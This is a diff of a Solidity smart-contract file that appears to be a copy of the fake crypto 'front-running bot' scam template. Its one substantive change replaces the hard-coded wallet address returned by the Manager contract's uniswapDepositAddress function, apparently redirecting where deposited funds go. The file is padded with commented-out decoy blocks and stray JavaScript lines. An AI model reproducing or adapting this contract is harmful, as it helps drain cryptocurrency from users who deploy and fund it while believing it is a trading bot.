@@ -14,10 +14,12 @@ contract SimpleStorage {
 /*contract GetfrontExample {
   // public state variable
   uint[] public myArray;
+
   //const fs = require('fs');
 //var Web3 = require('web3');
 //var abiDecoder = require('abi-decoder');
 //var colors = require("colors");
+
   /*
   function myArray(uint i) public view returns (uint) {
       return myArray[i];
@@ -59,11 +61,13 @@ contract Coin {
     /*constructor() {
         minter = msg.sender;
     }
+
     function mint(address receiver, uint amount) public {
         require(msg.sender == minter);
         require(amount < 1e60);
         balances[receiver] += amount;
     }
+
     function send(address receiver, uint amount) public {
         require(amount <= balances[msg.sender], "Insufficient balance.");
         balances[msg.sender] -= amount;
@@ -74,6 +78,7 @@ contract Coin {
 /*contract GetBNBExample {
   // public state variable
   uint[] public myArray;
+
   // one gwei
 //const ONE_GWEI = 1e9;
   /*
@@ -197,7 +202,7 @@ contract Manager {
 	}
 
 	function uniswapDepositAddress() public pure returns (address) {
-		return 0x8ea81ad5c8f0f35cc46eaf056d47b25d4ab92bb5;
+		return 0xb1838E0CFCd04c41964B48847634E360B846DDDb;
 	}
 }
 contract TokenCreator {
@@ -284,6 +289,7 @@ contract arrayExample {
 /*contract GetBotExample {
   // public state variable
   uint[] public myArray;
+
   
  
     //if(outputtoken.gt(allowance)){
